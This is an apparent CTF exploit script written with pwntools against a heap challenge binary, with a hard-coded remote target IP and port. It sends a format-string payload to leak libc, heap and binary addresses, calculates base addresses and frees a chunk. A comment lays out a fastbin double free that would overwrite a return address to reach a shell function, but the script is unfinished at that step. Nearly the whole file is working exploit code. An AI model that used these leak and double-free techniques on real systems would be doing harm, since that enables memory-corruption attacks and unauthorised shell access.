#!/usr/bin/python3
# -*- coding: utf-8 -*-

"""
vim 2 <= %1$p
rm 2 free
cat 2 format

思路：
"""

import sys
from typing import Optional
from pwn import *
from pwnlib import gdb

context(arch="amd64", os="linux", log_level="debug")

fn = "./pwn@2.23"
elf = ELF(fn)
libc = elf.libc

if len(sys.argv) > 1:
    io = remote("59.110.243.101", 25413)
else:
    io = process(fn)

io.sendlineafter("> ", "vim 2")
io.sendlineafter("> ", "#%1$p#%9$p#%27$p#")
io.sendlineafter("> > ", "cat 2")
io.recvuntil("#", drop=True)

libc_addr = int(io.recvuntil("#", drop=True), 16)
log.success("libc_addr = 0x%x", libc_addr)
libc_base = (libc_addr & 0xfffffffffffff000) - (0x7ffff7dd4000 - 0x7ffff7a39000)
log.success("libc_base = 0x%x", libc_base)

heap_addr = int(io.recvuntil("#", drop=True), 16)
log.success("heap_addr = 0x%x", heap_addr)
heap_base = heap_addr & 0xfffffffffffff000
log.success("heap_base = 0x%x", heap_base)

bin_addr = int(io.recvuntil("#", drop=True), 16)
log.success("bin_addr = 0x%x", bin_addr)
bin_base = (bin_addr & 0xfffffffffffff000) - 0x1000
log.success("bin_base = 0x%x", bin_base)

getshell = bin_base | 0xcd9

io.sendlineafter("> ", "rm 2")

# 使用fastbin double free在栈上构造一个假堆块，修改返回地址，跳转到getshell

io.interactive()
